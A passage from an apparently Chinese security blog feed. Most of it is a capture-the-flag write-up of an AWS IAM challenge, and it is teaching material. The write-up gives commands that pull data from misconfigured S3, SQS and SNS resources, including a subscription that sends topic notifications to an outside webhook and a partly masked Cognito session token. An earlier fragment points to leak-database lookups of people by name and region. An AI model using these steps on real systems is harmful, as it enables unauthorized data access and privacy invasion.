class="subst">&#123;name&#125;</span>, <span class="subst">&#123;phone_number&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        write_excel(result, <span class="string">&#x27;result.xls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        parser = argparse.ArgumentParser()</span><br><span class="line">        parser.add_argument(<span class="string">&#x27;--data&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Path to the input Excel file (.xls)&#x27;</span>)</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line">        main(args.data)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="M8jMA">银行卡恢复</h1>相同的原理，成本更大，暂时不做。<h1 id="q61hi">另外一个成本较低的渠道</h1>社工库的猎魔查询 姓名+地区]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="情报" scheme="http://example.com/categories/%E6%83%85%E6%8A%A5/"/>
    
    
    <category term="情报" scheme="http://example.com/tags/%E6%83%85%E6%8A%A5/"/>
    
    <category term="社工" scheme="http://example.com/tags/%E7%A4%BE%E5%B7%A5/"/>
    
    <category term="仙术" scheme="http://example.com/tags/%E4%BB%99%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>云上CTF：IAM挑战WP</title>
    <link href="http://example.com/google/a469eb97.html"/>
    <id>http://example.com/google/a469eb97.html</id>
    <published>2024-10-11T08:52:45.000Z</published>
    <updated>2024-10-11T09:43:45.720Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="GOJBd">快速领证</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;wiz:exposed-storage-risky-as-usual&#125;</span><br><span class="line">&#123;wiz:you-are-at-the-front-of-the-queue&#125;</span><br><span class="line">&#123;wiz:always-suspect-asterisks&#125;</span><br><span class="line">&#123;wiz:principal-arn-is-not-what-you-think&#125;</span><br><span class="line">&#123;wiz:incognito-is-always-suspicious&#125;</span><br><span class="line">&#123;wiz:open-sesame-or-shell-i-say-openid&#125;</span><br></pre></td></tr></table></figure><h1 id="nD0ul">第一关：</h1><h2 id="nfAjX">题目给的IAM策略：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line"><span class="string">&quot;Statement&quot;</span>: [ </span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>, </span><br><span class="line"><span class="string">&quot;Principal&quot;</span>: <span class="string">&quot;*&quot;</span>, </span><br><span class="line"><span class="string">&quot;Action&quot;</span>: <span class="string">&quot;s3:GetObject&quot;</span>, </span><br><span class="line"><span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&quot;</span></span><br><span class="line">&#125;, </span><br><span class="line">&#123; </span><br><span class="line"><span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>, </span><br><span class="line"><span class="string">&quot;Principal&quot;</span>: <span class="string">&quot;*&quot;</span>, </span><br><span class="line"><span class="string">&quot;Action&quot;</span>: <span class="string">&quot;s3:ListBucket&quot;</span>, </span><br><span class="line"><span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&quot;</span>, </span><br><span class="line"><span class="string">&quot;Condition&quot;</span>: &#123; </span><br><span class="line"><span class="string">&quot;StringLike&quot;</span>: &#123; </span><br><span class="line"><span class="string">&quot;s3:prefix&quot;</span>: <span class="string">&quot;files/*&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HyLfi">策略漏洞：</h2>1. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">公开访问：</font>**<font style="background-color:rgb(249, 250, 251);">"Principal": "*"</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">表示该策略允许任何人（包括未经认证的用户）访问。这可能导致数据泄露或未经授权的访问。建议限制访问权限，只允许特定的IAM用户、角色或AWS账户访问。</font>2. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">过于宽泛的资源访问：</font>**<font style="background-color:rgb(249, 250, 251);">"Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">表示允许访问该存储桶中的所有对象。如果有敏感数据或不应公开的文件，这可能导致数据泄露。建议限制资源访问，只允许访问特定路径或对象。</font>3. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">未限制IP地址：该策略没有限制来源IP地址，这意味着任何人都可以从任何地方访问。建议添加一个条件，限制访问来源IP地址范围。</font><h2 id="LO9b9">解题步骤：</h2><h3 id="cLkN0">1.列出存储桶的所有文件：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> s3://thebigiamchallenge-storage-9979f4b/</span><br></pre></td></tr></table></figure><h3 id="Qx7xc">2.进一步列目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> s3://thebigiamchallenge-storage-9979f4b/files</span><br></pre></td></tr></table></figure><h3 id="JXIbC">3.下载flags1.txt文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flags1.txt /tmp/flags.txt</span><br></pre></td></tr></table></figure><h3 id="ZD3a9">4.查看flags.txt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/flags.txt</span><br></pre></td></tr></table></figure><h1 id="jAemz">第二关：</h1><font style="color:rgb(255, 255, 255);background-color:rgb(2, 84, 236);">谷歌分析</font><p><font style="color:rgb(255, 255, 255);background-color:rgb(2, 84, 236);">我们专门针对这一挑战创建了自己的分析系统。</font><font style="color:rgb(255, 255, 255);background-color:rgb(2, 84, 236);">我们认为它非常好，甚至在此页面上使用了它。</font><font style="color:rgb(255, 255, 255);background-color:rgb(2, 84, 236);">可能会出什么问题？</font></p><p><font style="color:rgb(255, 255, 255);background-color:rgb(2, 84, 236);">加入我们的队列并获得秘密旗帜。</font></p><h2 id="KFu3k">题目给的IAM策略：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Principal&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;sqs:SendMessage&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sqs:ReceiveMessage&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fsvKY">策略漏洞：</h2>1. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">公开访问：</font>**<font style="background-color:rgb(249, 250, 251);">"Principal": "*"</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">表示该策略允许任何人（包括未经认证的用户）访问。这可能导致数据泄露或未经授权的访问。建议限制访问权限，只允许特定的IAM用户、角色或AWS账户访问。</font>2. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">过于宽泛的操作权限：该策略允许用户执行</font>**<font style="background-color:rgb(249, 250, 251);">SendMessage</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">和</font>**<font style="background-color:rgb(249, 250, 251);">ReceiveMessage</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">操作，这可能导致未经授权的发送和接收消息。根据最小权限原则，您应该根据实际需求限制操作权限。例如，如果某些用户只需要发送消息，而其他用户只需要接收消息，您可以为这两类用户创建单独的策略。</font>3. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">未限制IP地址：该策略没有限制来源IP地址，这意味着任何人都可以从任何地方访问。建议添加一个条件，限制访问来源IP地址范围。</font><p><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"></font></p><h2 id="IZBQh"><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">解题步骤：</font></h2><h3 id="ht3w3"><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">模拟消息接收</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sqs receive-message --queue-url https://sqs.us-east-1.awazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2</span><br></pre></td></tr></table></figure><p><img src="/google/a469eb97/img_1.png" alt="img.png"></p><ul><li><strong><font style="background-color:rgb(249, 250, 251);">MessageId</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">: 消息的唯一标识符。</font></li><li><strong><font style="background-color:rgb(249, 250, 251);">ReceiptHandle</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">: 用于稍后在删除消息时使用的临时凭证。</font></li><li><strong><font style="background-color:rgb(249, 250, 251);">MD5OfBody</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">: 消息正文的 MD5 哈希值，用于验证消息的完整性。</font></li><li><strong><font style="background-color:rgb(249, 250, 251);">Body</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">: 消息的正文，包含了您发送到队列的数据。在这个例子中，它是一个 JSON 对象，包含 </font><strong><font style="background-color:rgb(249, 250, 251);">URL</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">、</font><strong><font style="background-color:rgb(249, 250, 251);">User-Agent</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"> 和 </font><strong><font style="background-color:rgb(249, 250, 251);">IsAdmin</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"> 属性。</font></li></ul><h3 id="WfW3d">直接访问html</h3>第一步返回的url，以为要配合他给的临时凭证，然后发现这个临时凭证是删除时才使用的。<p><img src="/google/a469eb97/img.png" alt="img.png"></p><h1 id="CokZs">第三关：</h1><p><img src="/google/a469eb97/img_2.png" alt="img.png"></p><h2 id="ckOSD">题目给的IAM策略：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2008-10-17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Id&quot;</span>: <span class="string">&quot;Statement1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Sid&quot;</span>: <span class="string">&quot;Statement1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Principal&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;AWS&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;SNS:Subscribe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Condition&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;StringLike&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;sns:Endpoint&quot;</span>: <span class="string">&quot;*@tbic.wiz.io&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="kUd0W">策略漏洞：</h2>此IAM策略的漏洞是它允许任何AWS用户（由于主体为 "*"）订阅SNS主题。这可能会导致未经授权的用户接收到关于特定SNS主题的通知，从而泄露敏感信息。此外，由于条件限制了接收端点以 "@tbic.wiz.io" 结尾，攻击者可能会尝试创建满足此条件的恶意端点，以便接收这些通知。<p>为了利用这个漏洞，攻击者可以：</p><ol><li>使用他们自己的AWS账户。</li><li>创建一个满足条件（即以 “@tbic.wiz.io” 结尾）的恶意端点。</li><li>调用 SNS:Subscribe 操作，将其恶意端点添加到 “arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications” 主题中。</li></ol><p>这样，攻击者将能够接收到该SNS主题发送的通知，可能包括敏感信息。</p><h3 id="lNhjb">解题步骤：</h3><h3 id="RdaqC">创建符合后缀的恶意接口</h3>这里我们在网上随便找一个webhook的测试站（也可以自己本地搭建一个，只要能接收post请求）<p><a href="https://zh.altapps.net/soft/webhook-site?platform=web">Web的webhook.site替代品 — Altapps.net</a></p><h3 id="xFVmY">发送订阅请求</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint <span class="string">&#x27;https://requestinspector.com/inspect/01h40j155mjbn2vp2txfck7nd7/qqq@tbic.wiz.io&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/google/a469eb97/img_4.png" alt="img.png"></p><p>回到我们的接口查看</p><p><img src="/google/a469eb97/img_3.png" alt="img.png"></p><h3 id="WbMHw">确认订阅</h3>点击该确认订阅后，接口会接收到消息通知<p><img src="/google/a469eb97/img_5.png" alt="img.png"></p><p>发现了我们的flag</p><h1 id="Qx6lH">第四关：</h1><p><img src="/google/a469eb97/img_6.png" alt="img.png"></p><h2 id="GNzEY">题目给的IAM策略：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Principal&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;s3:GetObject&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Principal&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;s3:ListBucket&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Condition&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;StringLike&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;s3:prefix&quot;</span>: <span class="string">&quot;files/*&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;ForAllValues:StringLike&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;aws:PrincipalArn&quot;</span>: <span class="string">&quot;arn:aws:iam::133713371337:user/admin&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Fjbfa">策略漏洞：</h2>1. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">在第一个声明中，Effect为"Allow"，Principal为"*"，这意味着任何AWS用户（甚至未经认证的用户）都被允许执行"s3:GetObject"操作。这可能导致数据泄露，因为任何人都可以访问存储桶中的对象</font>2. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">在第二个声明中，虽然有条件限制，但由于Effect为"Allow"且Principal为"*"，这意味着任何AWS用户都可以尝试列出存储桶中的内容。虽然"s3:prefix"和"aws:PrincipalArn"的条件限制了对特定文件的访问，但仍然存在潜在的安全风险。</font><p><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"></font></p><h2 id="v4PcS"><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">解题步骤：</font></h2><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">在第一个声明中表明任何AWS用户都可以请求s3存储桶的文件，所以直接访问</font><p><img src="/google/a469eb97/img_7.png" alt="img.png"></p><p>但是发现没有权限</p><p><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">通过使用 </font><strong><font style="background-color:rgb(249, 250, 251);">–no-sign-request</font></strong><font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);"> 参数，您可以在未经认证的情况下访问 S3 存储桶。这意味着任何人都可以使用此命令下载存储桶中的所有文件，从而导致数据泄露。</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">cp</span> s3://thebigiamchallenge-admin-storage-abf1321/files /tmp/files --recursive --no-sign-request</span><br></pre></td></tr></table></figure><p><img src="/google/a469eb97/img_8.png" alt="img.png"></p><p>第二条规则同理：</p><p><img src="/google/a469eb97/img_9.png" alt="img.png"></p><p><img src="/google/a469eb97/img_10.png" alt="img.png"></p><h1 id="pIqjv">第五关：</h1><p><img src="/google/a469eb97/img_11.png" alt="img.png"></p><h2 id="m23Xn">题目给的IAM策略：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Sid&quot;</span>: <span class="string">&quot;VisualEditor0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;mobileanalytics:PutEvents&quot;</span>,</span><br><span class="line">                <span class="string">&quot;cognito-sync:*&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Sid&quot;</span>: <span class="string">&quot;VisualEditor1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;s3:GetObject&quot;</span>,</span><br><span class="line">                <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;Resource&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles&quot;</span>,</span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles/*&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DmQmR">策略漏洞：</h2>1. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">对于所有资源（*），允许执行</font>**<font style="background-color:rgb(249, 250, 251);">mobileanalytics:PutEvents</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">和</font>**<font style="background-color:rgb(249, 250, 251);">cognito-sync:*</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">操作。</font>2. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">对于名为</font>**<font style="background-color:rgb(249, 250, 251);">wiz-privatefiles</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">的S3存储桶及其所有对象，允许执行</font>**<font style="background-color:rgb(249, 250, 251);">s3:GetObject</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">和</font>**<font style="background-color:rgb(249, 250, 251);">s3:ListBucket</font>**<font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">操作。</font><h2 id="X3NSt">解题步骤：</h2>页面能展示图片我们可以查看一下js和html看是否有调用：<p><img src="/google/a469eb97/img_12.png" alt="img.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由此我们可以看到，我们从 cognito 获取凭据，然后页面使用它们来提取文件cognito1.png。</span><br><span class="line">从检查控制台我们可以获取由 javascript 创建的临时凭证。</span><br><span class="line">AWS.config.credentials</span><br></pre></td></tr></table></figure><p><img src="/google/a469eb97/img_13.png" alt="img.png"><br>获取到的信息：</p><p>然后把凭据配置到aws cli</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=<span class="string">&quot;A**************&quot;</span></span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=<span class="string">&quot;K**************&quot;</span></span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=<span class="string">&quot;IQ************l/uSpGRt+2siC653oBaEFX/RAiBFr3ze+ME5fTTm46TqDB7UKfI1blmLsOdPllB1Oj+51yqHBghzEAAaDDA5MjI5Nzg1MTM3NCIMrh7mVNvolL7OAUfaKuQFczYia9OmIf8WHlJmVNKxeNmZ8z0BtPiS/1lvaT8S73Bi/8Auj6+xl9GztHc92nM2yZ0lFh+8/vlqRL0Cl9e9tyJKE2+pCBQsAB8UYanuZGStKCRWvYjH+TC3tdu859OAlkXdpELafnUnFr5+aOHGcdmL1FLeplDqTUtURGCuooJgmir0PNZ7fUt8wbpRjoIq6i2MELnHhNdppjQNrmKjP82oYop7tNwjx5/EPV/HogHzAYQGVLxqQYV0u11XMFe0Y0DQfm+/IMQXIXmLMI5RC3k011zxDzowTCd9DrMkg3Sasy6A5LpEVJyHOXojkaY4wO7KXAqPPNiTxLxW1nc1VyKOEEXBFHGERZIicx8Jn1jyLD7wEdyOlYHQAQOeLPM+2Lcn2WMvq/mnoXfUAKkrKY/7fhQF4QPwwdKfbXrvpdSMHuZu6iLWFTCvdorzMZVcTvGYJbFVbgDjfYk39o1Q1A56+d0QKy+Sh7q02ioM1OD/fHBRTvcvss3S6FXXzvGbvRDk++wQXqpzjUgkO/BmlJS8z28/yLsEj5RqPnH9+N4rXCWzOhyokANIaU+cPJWRbo5RhQykSrr0HlLjCSwz5wb11mc/uo7W65nndaSZAtGjHf18U/+tUnIQTDuTYSLKZ7FE/eIFy+WA64iAQAeFnXqh6LZX/AGc9NiZ53REAo94UVY6IfZpFHsmXsjfee01TQVCFsv6NEFA6QlECS0aCgU445Z5dsXVSY9WElRG2oGM9ek/X3Jg9CLEmWHZdeGCLAVepn9uPlpAEw/6xkIfRGrq14iwdpxoolvxXd4tBK03IMq2s5twagk275jA4RQjzxSpFr+DX5mRliHhvmaKwc7ZRy7an6IvZs4w7+UDn8nvHue9Vp9EeFJJsYpX4flhh8xnIXY6Yi4K6S02CXPhz03MbUavvV580rtTCo3bxf+5AM0GHwYnHXlV1DlJhkApY/13II8f11RKCmyz5QAtsXjJtakwjYHwpAY6iAJ/LDgBodPs+Ct2MJyAISH+ky+uzMFNWhX98OKKzfLLzZ6redJi5vx6s7g+e8pHKZd8rJuBM9ZsXJz1I+e3LbxCxR+XCHiON+/Y9pQfxbPSzFe2y8NWqJix5CJd5Sb8S71o434bz43HVBMysAVjEm0QKCBEGngzAi7J5ifyDuBYGYvIAbFp/xlb4hSgqtj3Y661CsQ5XddAWdE15oQr4jyXo7/3N6Be4AGNitAbJ75HvkrkH8PhDPNNRCAayptqY33VE+lwUltXi6T9hZmpVFafaCDp95c4aPLS7qtSsJPQZCfcP00yW4/kG4Wk75OK2jw41fB+g11k5NHKwBMsWnHruVlotQgmgiA=&quot;</span></span><br></pre></td></tr></table></figure><p>可是这里一直设置有问题，问一下强哥</p><p>强哥给我说直接用他的js执行一遍，他能取到你也可以取到。</p><p><img src="/google/a469eb97/img_14.png" alt="img.png"></p><p>可以看到，这里取到了flag1.txt了，直接访问</p><p>::: info<br>当然这样要靠猜文件名<br>:::</p><p><img src="/google/a469eb97/img_15.png" alt="img.png"></p><p><img src="/google/a469eb97/img_16.png" alt="img.png"></p><p>直接用脚本来实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 